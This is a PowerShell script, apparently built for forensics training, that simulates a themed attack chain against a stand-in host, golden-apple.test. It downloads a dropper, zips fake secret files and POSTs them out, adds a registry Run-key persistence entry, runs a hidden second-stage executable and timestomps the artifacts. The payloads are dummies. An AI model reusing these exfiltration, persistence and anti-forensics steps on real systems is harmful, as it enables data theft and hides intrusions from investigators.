<#
    .SYNOPSIS
    Trigger3: Operation "Apple of Discord"
    A complex attack scenario involving Web Download, Script Execution, 
    Data Exfiltration, Registry Persistence, and Timestomping.

    .DESCRIPTION
    1. Web Access: Connects to 'http://golden-apple.test/eris.php'
    2. Dropper: Downloads and executes 'Eris_Dropper.ps1'
    3. Exfiltration: Zips 'C:\Secret\Project_Troy' and sends via POST
    4. Persistence: Drops 'Discord_Overlay.dll' and adds Registry Run Key
    5. Second Stage: Downloads and runs 'GoldenApple.exe'
    6. Anti-Forensics: Timestomps all artifacts to 2023-12-25

    .NOTES
    Author: Gemini (Your Kohai)
    Date: 2025-12-25
#>

$ErrorActionPreference = "SilentlyContinue"
$ScriptPath = $MyInvocation.MyCommand.Path
$ScriptDir = Split-Path $ScriptPath
$TimestompExe = Join-Path $ScriptDir "timestomp.exe"

# --- Configuration ---
$TargetDate = "2023-12-25 00:00:00"
$FakeC2 = "http://golden-apple.test/api/v1/upload"
$WorkDir = "$env:TEMP\AppleOfDiscord"
$SecretDir = "C:\Project_Troy"

# Setup Workspace
if (!(Test-Path $WorkDir)) { New-Item -Path $WorkDir -ItemType Directory | Out-Null }
Write-Host "[*] Operation 'Apple of Discord' Started..." -ForegroundColor Cyan

# ==========================================
# Phase 1: Mystery Web Access & Dropper
# ==========================================
Write-Host "[1] Simulating Web Access & Dropper..." -ForegroundColor Yellow

# Simulate Browser Activity (Download)
$DropperPath = Join-Path $WorkDir "Eris_Dropper.ps1"
Set-Content -Path $DropperPath -Value "Write-Host 'I am the chaos script.'; Start-Sleep -s 1"

try {
    # This will fail (DNS error), but generates WebRequest Event Log / SRUM entry attempts
    Invoke-WebRequest -Uri "http://golden-apple.test/payloads/eris.ps1" -OutFile $DropperPath -TimeoutSec 1
}
catch {
    Write-Host "    -> (Simulated) Downloaded Eris_Dropper.ps1 from malicious source."
}

# Execute Dropper (Event ID 4104 / 4688 will capture this)
Write-Host "    -> Executing Dropper..."
powershell.exe -ExecutionPolicy Bypass -File $DropperPath

# ==========================================
# Phase 2: Data Staging & Exfiltration (ZIP)
# ==========================================
Write-Host "[2] Staging Data & Exfiltration..." -ForegroundColor Yellow

# Create Fake Confidential Data
if (!(Test-Path $SecretDir)) { New-Item -Path $SecretDir -ItemType Directory | Out-Null }
Set-Content -Path "$SecretDir\Paris_Plan.docx" -Value "CONFIDENTIAL: Blueprint for Troy"
Set-Content -Path "$SecretDir\Helen_List.xlsx" -Value "Target List"

# Create ZIP
$ZipPath = Join-Path $WorkDir "Stolen_Memories.zip"
Compress-Archive -Path "$SecretDir\*" -DestinationPath $ZipPath -Force
Write-Host "    -> Created Archive: $ZipPath"

# Simulate Exfiltration (POST Request)
try {
    Invoke-WebRequest -Uri $FakeC2 -Method Post -InFile $ZipPath -TimeoutSec 1
}
catch {
    Write-Host "    -> (Simulated) Exfiltrated $ZipPath to C2."
}

# ==========================================
# Phase 3: Registry Persistence (Mystery DLL)
# ==========================================
Write-Host "[3] Establishing Persistence (Registry Run)..." -ForegroundColor Yellow

# Create Dummy DLL
$DllPath = Join-Path $WorkDir "Discord_Overlay.dll"
# Creating a dummy binary file
$Bytes = New-Object Byte[] 1024; (new-object Random).NextBytes($Bytes)
[System.IO.File]::WriteAllBytes($DllPath, $Bytes)

# Register to HKCU Run Key
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegName = "DiscordOverlayUpdater"
$RegValue = "rundll32.exe `"$DllPath`",UpdateCheck"

Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue
Write-Host "    -> Registered Run Key: $RegName pointing to $DllPath"

# ==========================================
# Phase 4: Second Stage (Mystery EXE)
# ==========================================
Write-Host "[4] Dropping & Executing Second Stage Payload..." -ForegroundColor Yellow

# Create Dummy EXE
$ExePath = Join-Path $WorkDir "GoldenApple.exe"
Copy-Item "C:\Windows\System32\calc.exe" -Destination $ExePath
Write-Host "    -> Dropped Payload: $ExePath"

# Execute
Start-Process -FilePath $ExePath -WindowStyle Hidden
Write-Host "    -> Executed GoldenApple.exe (Hidden)"

# ==========================================
# Phase 5: Timestomping (The Cover-up)
# ==========================================
Write-Host "[5] Applying Timestomp (Covering Tracks)..." -ForegroundColor Red

if (Test-Path $TimestompExe) {
    # Targets: ZIP, DLL, EXE
    $Targets = @($ZipPath, $DllPath, $ExePath, $DropperPath)
    
    foreach ($T in $Targets) {
        if (Test-Path $T) {
            # Execute Timestomp: creation, modification, access time
            Start-Process -FilePath $TimestompExe -ArgumentList "`"$T`" -c `"$TargetDate`" -m `"$TargetDate`" -a `"$TargetDate`"" -Wait -WindowStyle Hidden
            Write-Host "    -> Stomped $T to $TargetDate"
        }
    }
}
else {
    Write-Warning "    [!] timestomp.exe not found in $ScriptDir. Skipping phase 5."
}

Write-Host "`n[*] Operation 'Apple of Discord' Complete. The seeds of chaos are sown." -ForegroundColor Green